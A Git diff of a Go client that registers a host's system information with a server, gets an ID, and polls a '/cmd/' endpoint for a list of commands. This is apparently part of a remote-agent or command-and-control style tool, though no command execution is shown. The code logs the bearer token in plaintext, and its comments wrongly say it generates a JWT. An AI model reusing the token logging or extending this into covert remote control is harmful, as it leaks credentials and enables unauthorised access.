@@ -1,49 +1,118 @@
+// Function to generate a JWT token using the provided API and return the ID
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	log "github.com/sirupsen/logrus"
-	"github.com/valyala/fasthttp"
+	"io"
+	"net/http"
+	"strconv"
 )
 
-func register(serverURL string) error {
-	// Marshal the struct to JSON
+// Function to generate a JWT token using the provided API and return the ID or an error
+func register(baseURL, token string, sysInfo *SystemInfo) (int, error) {
+	apiEndpoint := baseURL + "/register"
+
 	payload, err := json.Marshal(sysInfo)
 	if err != nil {
-		return fmt.Errorf("Error marshalling JSON: %v", err)
+		return 0, err
 	}
 
-	// Send the JSON payload via HTTP POST request
-	req := fasthttp.AcquireRequest()
-	defer fasthttp.ReleaseRequest(req)
-
-	req.Header.SetContentType("application/json")
-	req.SetRequestURI(serverURL)
-	req.SetBody(payload)
-
-	resp := fasthttp.AcquireResponse()
-	defer fasthttp.ReleaseResponse(resp)
-
-	if err := fasthttp.Do(req, resp); err != nil {
-		return fmt.Errorf("Error sending HTTP request: %v", err)
+	// Prepare the request
+	req, err := http.NewRequest("POST", apiEndpoint, bytes.NewBuffer(payload))
+	if err != nil {
+		return 0, err
 	}
 
-	// Extract the ID from the response JSON and update the sysInfo struct
-	var response struct {
-		ID int8 `json:"id"`
+	// Set the JWT token in the request header
+	req.Header.Set("Authorization", "Bearer "+token)
+	req.Header.Set("Content-Type", "application/json")
+
+	// Make the request to the API
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return 0, err
 	}
-	if err := json.Unmarshal(resp.Body(), &response); err != nil {
-		return fmt.Errorf("Error parsing response JSON: %v", err)
+	defer func(Body io.ReadCloser) {
+		err := Body.Close()
+		if err != nil {
+			log.Fatal(err)
+		}
+	}(resp.Body)
+
+	// Check the response status code
+	if resp.StatusCode != http.StatusOK {
+		return 0, fmt.Errorf("API request failed with status code %d", resp.StatusCode)
 	}
 
-	sysInfo.ID = response.ID
+	// Parse the response and extract the ID
+	var responseData map[string]int
+	err = json.NewDecoder(resp.Body).Decode(&responseData)
+	if err != nil {
+		return 0, err
+	}
 
-	// Print the HTTP response status code and body
+	id, ok := responseData["id"]
+	if !ok {
+		return 0, fmt.Errorf("Failed to get ID from API response")
+	}
+
+	// Log the success
 	log.WithFields(log.Fields{
-		"status_code": resp.StatusCode(),
-		"response":    string(resp.Body()),
-	}).Info("HTTP Response")
+		"token": token,
+		"id":    id,
+	}).Info("Token generated and ID obtained from API")
 
-	return nil
+	return id, nil
 }
+
+func receiveCommands(baseURL string, token string, id int) ([]string, error) {
+	apiEndpoint := baseURL + "/cmd/" + strconv.Itoa(int(id))
+
+	// Prepare the request
+	req, err := http.NewRequest("GET", apiEndpoint, bytes.NewBuffer(nil))
+	if err != nil {
+		return nil, err
+	}
+
+	// Set the JWT token in the request header
+	req.Header.Set("Authorization", "Bearer "+token)
+	req.Header.Set("Content-Type", "application/json")
+
+	// Make the request to the API
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer func(Body io.ReadCloser) {
+		err := Body.Close()
+		if err != nil {
+			log.Fatal(err)
+		}
+	}(resp.Body)
+
+	// Check the response status code
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("API request failed with status code %d", resp.StatusCode)
+	}
+
+	// Parse the response and extract the ID
+
+	var commandList CommandList
+	err = json.NewDecoder(resp.Body).Decode(&commandList)
+	if err != nil {
+		return nil, err
+	}
+	log.Info("Received commands: ", commandList.Commands)
+
+	return commandList.Commands, nil
+}
+
+//func receiveInstructions(baseURL string, token string, id int8) {
+//	apiEndpoint := baseURL + "/ins/" + strconv.Itoa(int(id))
+//
+//}
